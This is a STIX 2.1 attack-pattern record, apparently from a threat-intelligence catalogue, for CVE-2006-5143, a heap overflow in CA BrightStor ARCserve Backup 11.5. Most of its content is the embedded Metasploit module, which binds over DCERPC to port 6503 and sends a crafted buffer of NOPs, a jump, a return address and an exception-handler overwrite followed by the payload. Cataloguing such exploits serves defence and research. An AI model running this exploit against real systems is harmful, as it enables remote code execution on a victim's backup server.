{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7203bff-4595-4eee-9d34-13a5844ca55a",
    "created": "2024-08-14T16:48:13.348912Z",
    "modified": "2024-08-14T16:48:13.348916Z",
    "name": "CA BrightStor ARCserve Message Engine Heap Overflow",
    "description": " This module exploits a heap overflow in Computer Associates BrightStor ARCserve Backup 11.5. By sending a specially crafted RPC request, an attacker could overflow the buffer and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/message_engine_heap.rb",
            "external_id": "message_engine_heap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5143"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::DCERPC\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor ARCserve Message Engine Heap Overflow',\n      'Description'    => %q{\n          This module exploits a heap overflow in Computer Associates BrightStor ARCserve Backup\n        11.5. By sending a specially crafted RPC request, an attacker could overflow the\n        buffer and execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-5143' ],\n          [ 'OSVDB', '29533' ],\n          [ 'BID', '20365' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 800,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          ['Windows 2000 SP4 English',   { 'Ret' => 0x7c2f6cc8, 'UEF' => 0x7c54144c } ],\n        ],\n      'DisclosureDate' => '2006-10-05',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6503)\n      ])\n  end\n\n  def exploit\n    connect\n\n    handle = dcerpc_handle('dc246bf0-7a7a-11ce-9f88-00805fe43838', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])\n    print_status(\"Binding to #{handle} ...\")\n\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    # straight forward heap stuffz\n    sploit =  make_nops(680) + \"\\xeb\\x0a\" + make_nops(2) + [ target.ret ].pack('V')\n    sploit << [ target['UEF'] ].pack('V') + payload.encoded\n\n    print_status(\"Trying target #{target.name}...\")\n\n      begin\n        dcerpc_call(43, sploit)\n        rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-10-05",
    "x_mitre_platforms": [
        "win'"
    ]
}